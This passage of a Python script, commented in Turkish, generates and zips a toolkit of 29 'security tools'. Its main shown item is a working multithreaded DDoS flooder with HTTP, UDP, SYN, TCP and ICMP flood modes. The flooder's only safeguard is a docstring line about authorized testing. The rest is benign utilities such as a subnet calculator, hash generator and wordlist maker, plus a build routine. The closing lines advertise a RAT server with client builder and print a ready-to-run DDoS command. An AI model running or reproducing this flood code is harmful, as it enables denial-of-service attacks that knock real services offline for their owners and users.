"12_ddos_attack.py": r'''#!/usr/bin/env python3
"""DDoS Stress Tester - SYN/UDP/HTTP/ICMP flood.
Not: Yalnizca yetkili testlerde kullanin. Raw socket yoksa
otomatik olarak root gerektirmeyen fallback moduna gecer.
"""
import socket, sys, time, threading, random, os, subprocess, argparse

def http_flood(ip, port, dur, threads):
    stop = time.time() + dur
    def worker():
        paths = ["/", "/index.html", "/login", "/api", "/?q=%d" % random.randint(0, 9999)]
        while time.time() < stop:
            try:
                s = socket.create_connection((ip, port), timeout=3)
                req = "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n" \
                      % (random.choice(paths), ip)
                s.send(req.encode()); s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    print("[+] HTTP flood bitti (%d thread, %d sn)" % (threads, dur))

def udp_flood(ip, port, dur, threads):
    stop = time.time() + dur
    def worker():
        payload = os.urandom(1024)
        while time.time() < stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port)); s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    print("[+] UDP flood bitti")

def syn_flood(ip, port, dur, threads):
    if os.geteuid() == 0:
        print("[*] Raw socket SYN flood (root)...")
        subprocess.run("timeout %d hping3 -S --flood -p %d %s 2>/dev/null || true" % (dur, port, ip), shell=True)
    else:
        print("[!] Root yok; TCP connect flood fallback'i kullaniliyor...")
        tcp_flood(ip, port, dur, threads)

def tcp_flood(ip, port, dur, threads):
    stop = time.time() + dur
    def worker():
        while time.time() < stop:
            try:
                s = socket.socket(); s.settimeout(2)
                s.connect((ip, port)); s.send(b"\x00" * 512); s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()

def icmp_flood(ip, dur):
    print("[*] ICMP flood (ping -f)...")
    subprocess.run("timeout %d ping -f -c 1000000 %s > /dev/null 2>&1 || true" % (dur, ip), shell=True)

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="DDoS Stress Tester (yetkili testler icin)")
    p.add_argument("target")
    p.add_argument("--mode", default="http", choices=["http", "udp", "syn", "tcp", "icmp"])
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--time", type=int, default=10, dest="dur")
    p.add_argument("--threads", type=int, default=100)
    a = p.parse_args()
    try:
        ip = socket.gethostbyname(a.target)
    except Exception:
        print("[!] Hedef cozumlenemedi"); sys.exit(1)
    print("[!] HEDEF: %s (%s) | MOD: %s | SURE: %d sn" % (a.target, ip, a.mode, a.dur))
    print("[!] Saldiri basliyor... (Ctrl+C ile durdur)")
    try:
        if a.mode == "http": http_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "udp": udp_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "syn": syn_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "tcp": tcp_flood(ip, a.port, a.dur, a.threads)
        elif a.mode == "icmp": icmp_flood(ip, a.dur)
    except KeyboardInterrupt:
        print("\n[!] Durduruldu")
    print("[+] Test tamam")
''',
                }
                # =================== CUSTOM TOOLS (7) ===================
custom = {

"01_base_converter.py": r'''#!/usr/bin/env python3
"""Base Converter - dec/hex/bin/oct."""
import argparse, sys
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("value"); p.add_argument("--from", dest="frm", default="10")
    p.add_argument("--to", default="16")
    a = p.parse_args()
    bases = {"2": 2, "8": 8, "10": 10, "16": 16}
    try:
        n = int(a.value, bases[a.frm])
        print("[+] Sonuc (%s): %s" % (a.to, {2: bin, 8: oct, 10: str, 16: hex}[a.to](n).replace("0x", "").replace("0o", "").replace("0b", "")))
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"02_subnet_calculator.py": r'''#!/usr/bin/env python3
"""Subnet Calculator."""
import ipaddress, argparse
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("cidr")
    a = p.parse_args()
    try:
        n = ipaddress.ip_network(a.cidr, strict=False)
        print("[+] Ag: %s" % n)
        print("[+] Mask: %s" % n.netmask)
        print("[+] Wildcard: %s" % n.hostmask)
        print("[+] Ag adresi: %s" % n.network_address)
        print("[+] Broadcast: %s" % n.broadcast_address)
        print("[+] Kullanilabilir: %s - %s" % (list(n.hosts())[0], list(n.hosts())[-1]))
        print("[+] Toplam host: %d" % n.num_addresses)
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"03_hash_generator.py": r'''#!/usr/bin/env python3
"""Hash Generator - md5/sha1/sha256/sha512."""
import hashlib, argparse
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("text"); p.add_argument("--algo", default="md5")
    a = p.parse_args()
    fns = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256, "sha512": hashlib.sha512}
    fn = fns.get(a.algo.lower())
    if not fn: print("[!] Bilinmeyen algo"); exit(1)
    print("[+] %s: %s" % (a.algo.upper(), fn(a.text.encode()).hexdigest()))
''',

"04_mac_generator.py": r'''#!/usr/bin/env python3
"""MAC Address Generator."""
import random, argparse
def gen():
    return "02:" + ":".join("%02x" % random.randint(0, 255) for _ in range(5))
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=5)
    a = p.parse_args()
    for _ in range(a.count): print("[+] " + gen())
''',

"05_ip_generator.py": r'''#!/usr/bin/env python3
"""Random IP / CIDR Generator."""
import random, argparse, ipaddress
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=5)
    a = p.parse_args()
    for _ in range(a.count):
        print("[+] %d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)))
''',

"06_ssid_generator.py": r'''#!/usr/bin/env python3
"""SSID/Wordlist Generator."""
import random, argparse, itertools
WORDS = ["admin","wifi","net","home","fiber","tp-link","guest","office","ev","modem","hotspot","wlan","data","air","speed"]
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--count", type=int, default=10)
    a = p.parse_args()
    for _ in range(a.count):
        w = random.sample(WORDS, 2)
        print("[+] %s_%s%s" % (w[0], w[1], random.randint(1, 99)))
''',

"07_wordlist_maker.py": r'''#!/usr/bin/env python3
"""Wordlist Maker - kombinasyon/mask uretir."""
import argparse, itertools, string
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--min", type=int, default=4)
    p.add_argument("--max", type=int, default=6)
    p.add_argument("--chars", default="abc123")
    p.add_argument("--out", default="wordlist.txt")
    a = p.parse_args()
    n = 0
    with open(a.out, "w") as f:
        for L in range(a.min, a.max + 1):
            for combo in itertools.product(a.chars, repeat=L):
                f.write("".join(combo) + "\n"); n += 1
                if n >= 1000000: break
    print("[+] Uretildi: %s (%d satir)" % (a.out, n))
''',
}
# =================== URETICI ===================
def write_all(base, d, label):
    for fname, content in d.items():
        fp = os.path.join(base, label, fname)
        with open(fp, "w") as f: f.write(content)
        os.chmod(fp, 0o755)
    print("[+] %s: %d arac yazildi" % (label, len(d)))

def compile_test(base):
    ok, fail = 0, []
    for label in ("cybersec_tools", "pentest_tools", "custom_tools"):
        for fn in sorted(os.listdir(os.path.join(base, label))):
            if not fn.endswith(".py"): continue
            r = subprocess.run([sys.executable, "-m", "py_compile",
                                os.path.join(base, label, fn)], capture_output=True)
            if r.returncode == 0: ok += 1
            else: fail.append("%s/%s" % (label, fn))
    return ok, fail

def main():
    os.makedirs("%s/cybersec_tools" % BASE, exist_ok=True)
    os.makedirs("%s/pentest_tools" % BASE, exist_ok=True)
    os.makedirs("%s/custom_tools" % BASE, exist_ok=True)
    write_all(BASE, cybersec, "cybersec_tools")   # 10
    write_all(BASE, pentest, "pentest_tools")     # 12 (RAT + DDoS dahil)
    write_all(BASE, custom, "custom_tools")       # 7
    # ZIP
    with zipfile.ZipFile(ZIPF, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(BASE):
            for fn in files:
                fp = os.path.join(root, fn)
                zf.write(fp, os.path.relpath(fp, os.path.dirname(BASE)))
    print("[+] ZIP: %s (%.1f KB)" % (ZIPF, os.path.getsize(ZIPF) / 1024))
    # Derleme testi
    ok, fail = compile_test(BASE)
    print("[+] Derleme: %d OK" % ok)
    if fail:
        print("[-] Hata verenler: %s" % fail)
    else:
        print("[+] 29 aracin TAMAMI derlendi - hata YOK")
    # Fonksiyonel smoke test
    tests = [
        ("custom_tools/01_base_converter.py", ["255", "--from", "10", "--to", "16"]),
        ("custom_tools/03_hash_generator.py", ["test", "--algo", "sha256"]),
        ("cybersec_tools/05_password_strength.py", ["MyStr0ng!Pass"]),
        ("custom_tools/02_subnet_calculator.py", ["192.168.1.0/24"]),
        ("custom_tools/04_mac_generator.py", ["--count", "2"]),
    ]
    for tool, args in tests:
        try:
            r = subprocess.run([sys.executable, os.path.join(BASE, tool)] + args,
                               capture_output=True, text=True, timeout=10)
            print("[%s] %s: %s" % ("OK" if r.returncode == 0 else "FAIL",
                                    tool, r.stdout.strip().splitlines()[0] if r.stdout.strip() else r.stderr.strip()[:60]))
        except Exception as e:
            print("[ERR] %s: %s" % (tool, e))
    print("\n[+] TAMAM! Klasor: %s" % BASE)
    print("[+] RAT:  python3 pentest_tools/11_rat_server.py --port 4444  |  --make-client client.py")
    print("[+] DDoS: python3 pentest_tools/12_ddos_attack.py 1.2.3.4 --mode http --time 10 --threads 100")

if __name__ == "__main__":
    main()
